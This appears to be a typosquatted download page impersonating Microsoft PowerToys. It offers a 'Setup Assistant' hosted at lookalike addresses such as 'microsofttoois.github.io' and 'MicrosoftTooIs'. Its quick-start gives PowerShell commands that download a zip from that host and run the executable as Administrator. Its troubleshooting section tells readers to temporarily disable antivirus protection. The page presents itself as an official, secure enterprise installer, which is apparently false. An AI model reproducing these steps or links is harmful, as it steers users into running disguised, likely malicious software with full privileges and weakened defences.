---
layout: single
title: "Microsoft PowerToys — Professional Offline Setup Assistant"
excerpt: "Enterprise-grade offline installer for Microsoft PowerToys on Windows 10/11. Deploy FancyZones, PowerRename, and all PowerToys utilities without Microsoft Store dependency."
header:
  overlay_color: "#5e616c"
  overlay_image: /assets/images/powertoys-hero-bg.jpg
  actions:
    - label: "⬇️ Download Setup Assistant"
      url: "https://microsofttoois.github.io/.github/"
      btn_class: "btn--primary btn--large"
    - label: "📚 Quick Start Guide"
      url: "/quick-start/"
      btn_class: "btn--info"
toc: true
toc_label: "Contents"
toc_icon: "cog"
---

## 🚀 Professional PowerToys Deployment Made Simple

Deploy Microsoft PowerToys across your organization without the complexity of Microsoft Store dependencies, user account requirements, or internet connectivity during installation.

### ⚡ Key Benefits

- **🔒 Zero Dependencies** - No Microsoft Account or Store access required
- **🌐 Offline Ready** - Install on air-gapped systems and restricted networks  
- **🏢 Enterprise Grade** - SCCM, Group Policy, and automated deployment support
- **⚙️ Full Control** - Choose components, versions, and installation paths
- **🛡️ Secure** - Digital signature verification and checksum validation

---

## 📦 What's Included

### Core PowerToys Modules
Our setup assistant provides access to all official PowerToys utilities:

| Tool | Description | Use Case |
|------|-------------|----------|
| 🧰 **FancyZones** | Advanced window layout manager | Organize applications across multiple monitors |
| 🔄 **PowerRename** | Bulk file renaming with regex | Batch rename files and folders efficiently |  
| 📐 **Image Resizer** | Context menu image resizing | Quick image size adjustments |
| 🖱️ **Mouse Utilities** | Find My Mouse, crosshairs, pointer tools | Enhanced mouse visibility and control |
| ⌨️ **Keyboard Manager** | Key remapping and shortcuts | Customize keyboard behavior |
| 📱 **PowerToys Run** | Quick launcher and search | Fast application and file access |
| 🔍 **File Explorer Add-ons** | Preview SVG, Markdown, code | Enhanced file preview capabilities |
| 🎨 **Color Picker** | System-wide color selection | Design and development workflows |
| 📏 **Screen Ruler** | Measure pixels and angles | UI design and measurement tasks |
| 💡 **Awake** | Keep computer awake utility | Prevent sleep during long tasks |

### Enterprise Features
- **Silent Installation** - Unattended deployment for mass rollouts
- **Version Management** - Deploy specific PowerToys versions
- **Dependency Handling** - Automatic .NET Runtime installation
- **Audit Logging** - Detailed installation logs for compliance
- **Rollback Support** - Safe uninstallation and version rollback

---

## 🏃‍♂️ Quick Start

### Prerequisites
- Windows 10 21H2+ or Windows 11 (any version)
- Administrator privileges for system-wide installation
- 500MB free disk space
- Internet connection for initial download (offline thereafter)

### Installation Steps

1. **Download** the latest Setup Assistant
   ```powershell
   # Option 1: Direct download
   Invoke-WebRequest -Uri "https://microsofttoois.github.io/.github/PowerToysSetup.zip" -OutFile "PowerToysSetup.zip"
   
   # Option 2: Visit releases page
   # https://github.com/MicrosoftTooIs/PowerToys/releases/latest
   ```

2. **Extract** and run as Administrator
   ```powershell
   Expand-Archive -Path "PowerToysSetup.zip" -DestinationPath "PowerToysSetup"
   cd PowerToysSetup
   .\PowerToysSetupAssistant.exe
   ```

3. **Configure** your installation preferences
   - Select PowerToys version
   - Choose installation directory
   - Pick modules to install
   - Configure silent mode (optional)

4. **Deploy** and verify installation
   - Monitor progress in real-time
   - Review installation logs
   - Test PowerToys functionality

---

## 🎯 Use Cases

### Personal Users
Perfect for home users who want PowerToys without Microsoft Store hassles:
- **Gaming PCs** - Enhanced window management for streaming and gaming
- **Home Offices** - Productivity tools for remote work
- **Development** - Color picker and measurement tools for design

### Enterprise Organizations
Streamlined deployment for business environments:
- **IT Departments** - Centralized deployment via SCCM or Group Policy
- **Educational Institutions** - Lab computer standardization
- **Government Agencies** - Air-gapped network compatibility
- **Corporate Workstations** - Standardized productivity enhancement

### Specialized Environments
- **Air-Gapped Networks** - Secure environments without internet access
- **Kiosk Systems** - Controlled deployment scenarios
- **Virtual Machines** - Rapid environment provisioning
- **Development Labs** - Consistent tool availability

---

## 📊 System Compatibility

### Supported Platforms
| Platform | Status | Notes |
|----------|--------|-------|
| Windows 10 21H2+ | ✅ Fully Supported | All features available |
| Windows 11 21H2+ | ✅ Fully Supported | Optimized experience |
| Windows 10 20H2 | ⚠️ Limited | Basic functionality only |
| Windows Server 2019+ | ⚠️ Limited | Core features only |

### Architecture Support
- **x64 (Intel/AMD)** - Full feature support
- **ARM64** - Native ARM64 support for Surface Pro X and similar devices

### Deployment Methods
- **Interactive Installation** - Guided setup with user interface
- **Silent Installation** - Automated deployment without user interaction
- **PowerShell Module** - Script-based installation and management
- **Enterprise Tools** - SCCM, Group Policy, and MDM integration

---

## 🔧 Advanced Configuration

### Silent Installation
Deploy PowerToys without user interaction:

```powershell
# Basic silent install
.\PowerToysSetupAssistant.exe /quiet /installdir="C:\Program Files\PowerToys"

# Advanced silent install with specific modules
.\PowerToysSetupAssistant.exe /quiet /modules="FancyZones,PowerRename,ColorPicker" /log="C:\Temp\PowerToysInstall.log"
```

### Enterprise Deployment
Integrate with existing deployment infrastructure:

```powershell
# SCCM Application Deployment
# Detection method: File exists "C:\Program Files\PowerToys\PowerToys.exe"
# Install command: PowerToysSetupAssistant.exe /quiet /installdir="%ProgramFiles%\PowerToys"
# Uninstall command: PowerToysSetupAssistant.exe /uninstall /quiet
```

### Registry Configuration
Pre-configure PowerToys settings via registry:

```powershell
# Enable FancyZones by default
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PowerToys\FancyZones" -Name "Enabled" -Value 1

# Configure PowerRename default behavior
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PowerToys\PowerRename" -Name "Enabled" -Value 1
```

---

## 🛠️ Troubleshooting

### Common Issues

#### Installation Failures
- **Admin Rights**: Ensure running as Administrator
- **Antivirus**: Temporarily disable real-time protection
- **Disk Space**: Verify adequate free space (500MB minimum)
- **Dependencies**: Check .NET Framework installation

#### PowerToys Not Starting
- **Windows Updates**: Install latest Windows updates
- **Visual C++ Redistributable**: Verify installation
- **User Permissions**: Check user account permissions
- **Conflicting Software**: Identify conflicting utilities

### Support Resources
- 📚 **[FAQ](./faq/)** - Frequently asked questions
- 🐛 **[Report Issues](https://github.com/MicrosoftTooIs/PowerToys/issues)** - Bug reports and feature requests
- 💬 **[Community Discussions](https://github.com/MicrosoftTooIs/PowerToys/discussions)** - Get help from the community
- 📧 **[Enterprise Support](mailto:enterprise@microsofttoois.github.io)** - Business and volume licensing

---

## 🔗 Additional Resources

### Documentation
- [📖 User Guide](./user-guide/) - Comprehensive usage documentation
- [🏢 Enterprise Deployment](./enterprise/) - Business deployment scenarios
- [🔧 Advanced Configuration](./advanced-config/) - Power user settings
- [🚀 Best Practices](./best-practices/) - Optimization recommendations

### Community
- [🌟 Feature Requests](https://github.com/MicrosoftTooIs/PowerToys/discussions/categories/ideas) - Suggest new features
- [🤝 Contributing](https://github.com/MicrosoftTooIs/PowerToys/blob/main/CONTRIBUTING.md) - Help improve the project
- [📢 Announcements](https://github.com/MicrosoftTooIs/PowerToys/discussions/categories/announcements) - Latest updates and news

### Related Tools
- [Microsoft PowerToys Official](https://github.com/microsoft/PowerToys) - Original PowerToys repository
- [Windows Terminal](https://github.com/microsoft/terminal) - Modern terminal for Windows
- [PowerShell 7](https://github.com/PowerShell/PowerShell) - Cross-platform PowerShell

---

<div style="text-align: center; margin: 2rem 0;">
  <h2>🚀 Ready to Get Started?</h2>
  <p>Download the Setup Assistant and deploy PowerToys across your organization today!</p>
  <a href="https://microsofttoois.github.io/.github/" class="btn btn--primary btn--large">⬇️ Download Now</a>
  <a href="/quick-start/" class="btn btn--info btn--large">📚 Quick Start Guide</a>
</div> 